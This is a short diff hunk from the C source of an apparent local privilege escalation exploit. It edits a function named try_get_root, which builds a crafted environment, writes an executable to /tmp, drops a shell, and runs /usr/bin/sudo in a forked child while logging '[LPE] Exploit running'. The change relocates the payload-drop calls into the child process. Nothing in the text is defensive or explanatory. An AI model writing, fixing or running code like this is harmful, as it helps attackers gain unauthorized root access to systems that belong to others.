@@ -92,15 +92,14 @@ void try_get_root(Globals *glob) {
   envp[env_pos++] = "TZ=:";
   envp[env_pos++] = 0;
 
-  write_exe_to_tmp();
-  drop_shell();
-
   // fork and run exploit;
   int pid = global->fork();
   CHECK(pid == -1);
 
   if (pid == 0) {
     DEBUG_LOG("[LPE] Exploit running in forked process\n");
+    write_exe_to_tmp();
+    drop_shell();
     global->execve("/usr/bin/sudo", e_argv, envp);
   }
 
